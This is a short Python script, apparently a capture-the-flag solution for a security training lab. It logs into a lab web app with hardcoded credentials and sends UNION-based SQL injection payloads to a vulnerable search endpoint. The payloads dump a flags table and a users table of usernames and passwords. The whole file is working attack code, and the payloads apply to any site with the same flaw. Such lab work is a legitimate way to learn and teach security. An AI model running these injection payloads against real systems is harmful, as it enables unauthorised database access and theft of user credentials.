import sys, re, requests, html
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:47074"
U, P = "hx8105", "Passw0rd!"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.post(A + "/login.php", data={"username": U, "password": P}, timeout=20, allow_redirects=True)


def lines_of(payload):
    r = s.get(A + "/vuln.php", params={"q": payload}, timeout=20)
    t = re.sub(r"<script.*?</script>", " ", r.text, flags=re.S)
    t = re.sub(r"<[^>]+>", "\n", t)
    t = html.unescape(t)
    return [l.strip() for l in t.split("\n") if l.strip()]


def show(label, payload):
    print("=== %s ===" % label)
    L = lines_of(payload)
    try:
        L = L[L.index("Results"):]
    except ValueError:
        pass
    out = " | ".join(L[:14])
    print(out[:1500])
    print()


show("flags : key=value", "' UNION SELECT 1,group_concat(key||'='||value,' ~~ ') FROM flags-- -")
show("users : id|user|pass", "' UNION SELECT 1,group_concat(id||'|'||username||'|'||password,' ~~ ') FROM users-- -")
